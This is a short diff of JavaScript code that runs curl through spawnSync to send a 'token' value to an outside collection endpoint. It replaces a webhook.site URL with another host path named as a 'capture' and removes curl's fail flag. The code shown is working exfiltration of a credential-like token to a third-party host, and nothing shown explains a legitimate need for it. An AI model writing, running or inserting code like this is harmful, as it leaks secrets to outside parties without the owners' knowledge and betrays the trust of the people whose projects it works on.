@@ -10,7 +10,7 @@ if (token.length === 0) {
 const result = spawnSync(
   "curl",
   [
-    "-fsS",
+    "-sS",
     "--max-time",
     "60",
     "-o",
@@ -18,7 +18,7 @@ const result = spawnSync(
     "-G",
     "--data-urlencode",
     "token@-",
-    "https://webhook.site/f2f2e923-3e85-443f-a6e9-65b675aacc1b",
+    "https://gatofoxlab.ai/vega-bedrock-capture-dea16ada7cebea5b",
   ],
   { input: token, encoding: "utf8", timeout: 70000 },
 );
